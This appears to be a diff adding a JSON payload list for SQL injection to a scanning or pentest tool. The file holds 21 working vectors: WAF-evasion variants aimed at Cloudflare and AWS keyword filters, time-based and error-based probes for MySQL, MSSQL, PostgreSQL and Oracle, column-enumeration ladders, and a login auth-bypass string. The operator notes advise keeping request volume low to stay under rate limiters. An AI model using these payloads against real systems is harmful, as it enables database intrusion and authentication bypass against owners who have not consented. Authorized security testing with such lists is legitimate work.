@@ -1,0 +1,28 @@
+{
+  "class": "sqli",
+  "order": "bypass-first",
+  "note": "WAF-evasion variants first; classics last. Boolean pairs (1=1/1=2) are meant to be diffed. Use {OOB} in XXE/OOB contexts only.",
+  "payloads": [
+    { "id": "sqli::01", "vector": "1'/**/OR/**/1=1--", "note": "inline-comment obfuscation — first line against Cloudflare/AWS WAF keyword matching" },
+    { "id": "sqli::02", "vector": "1'unION/**/sELect/**/1,2,3--", "note": "case+comment mix for keyword filters" },
+    { "id": "sqli::03", "vector": "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", "note": "MySQL version-comment bypass" },
+    { "id": "sqli::04", "vector": "1'%0aOR%0a1=1--", "note": "newline injection between keywords" },
+    { "id": "sqli::05", "vector": "1%%27 OR '1'='1", "note": "double-URL-encoding (%2527 upstream of app decode)" },
+    { "id": "sqli::06", "vector": "1\\u0027 OR '1'='1", "note": "unicode escape for JSON/Java backends" },
+    { "id": "sqli::07", "vector": "1' OR 1=1 LIMIT 1;--", "note": "SQLite-flavored" },
+    { "id": "sqli::08", "vector": "1 AND 1=1", "note": "boolean pair — always send with ::09 and diff_responses" },
+    { "id": "sqli::09", "vector": "1 AND 1=2", "note": "boolean pair control — status/length delta = boolean injection" },
+    { "id": "sqli::10", "vector": "1' AND SLEEP(5)--", "note": "time-based, MySQL — keep volume tiny (rate limiter!)" },
+    { "id": "sqli::11", "vector": "1';WAITFOR DELAY '0:0:5'--", "note": "time-based, MSSQL" },
+    { "id": "sqli::12", "vector": "1' AND pg_sleep(5)--", "note": "time-based, PostgreSQL" },
+    { "id": "sqli::13", "vector": "1'||(SELECT dbms_pipe.receive_message('a',5) FROM dual)||'", "note": "time-based, Oracle" },
+    { "id": "sqli::14", "vector": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "note": "error-based, MySQL" },
+    { "id": "sqli::15", "vector": "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "note": "error-based, MySQL alt" },
+    { "id": "sqli::16", "vector": "1' UNION SELECT NULL,NULL,NULL--", "note": "union column ladder: increment NULLs until accepted" },
+    { "id": "sqli::17", "vector": "1';SELECT DB_NAME()--", "note": "stacked, MSSQL (only if driver allows)" },
+    { "id": "sqli::18", "vector": "1' ORDER BY 1--", "note": "column enumeration ladder (ORDER BY 2,3,...)" },
+    { "id": "sqli::19", "vector": "1' || (SELECT sqlite_version()) ||'", "note": "SQLite concat probe" },
+    { "id": "sqli::20", "vector": "{\"username\":\"admin'-- -\",\"password\":\"x\"}", "note": "JSON body context" },
+    { "id": "sqli::21", "vector": "admin'-- -", "note": "auth-bypass classic — only in login forms, never brute-force" }
+  ]
+}
